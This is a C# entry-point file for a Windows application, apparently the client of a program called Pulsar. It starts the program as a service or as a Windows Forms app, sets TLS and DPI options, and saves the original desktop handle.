using Pulsar.Client.Config;
using Pulsar.Client.IO;
using Pulsar.Client.Setup;
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Pulsar.Client
{
    internal static class Program
    {
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetThreadDesktop(uint dwThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint GetCurrentThreadId();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetProcessDPIAware();

        [STAThread]
        private static void Main(string[] args)
        {

            try
            {

                
                if (IsServiceMode(args))
                {

                    PulsarService.RunService();
                    return;
                }

                // enable TLS 1.2
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

                SetProcessDPIAware();

                if (!Settings.Initialize())
                {
                    Environment.Exit(1);
                    return;
                }

                // Set the unhandled exception mode to force all Windows Forms errors to go through our handler
                Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);

                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);

                SaveOriginalDesktop();

                var app = new PulsarApplication();

                Application.Run(app);

            }
            catch (Exception ex)
            {



                if (ex.InnerException != null)
                {

                }
                Environment.Exit(99);
            }
        }

        private static bool IsServiceMode(string[] args)
        {
            if (args == null)
            {
                return false;
            }

            foreach (var arg in args)
            {
                if (string.Equals(arg, "-service", StringComparison.OrdinalIgnoreCase) ||
                    string.Equals(arg, "--service", StringComparison.OrdinalIgnoreCase) ||
                    string.Equals(arg, "/service", StringComparison.OrdinalIgnoreCase))
                {
                    return true;
                }
            }

            return false;
        }

        internal static void EnableDPIAwareness()
        {
            SetProcessDPIAware();
        }

        internal static void SaveOriginalDesktop()
        {
            Settings.OriginalDesktopPointer = GetThreadDesktop(GetCurrentThreadId());
        }
    }
}
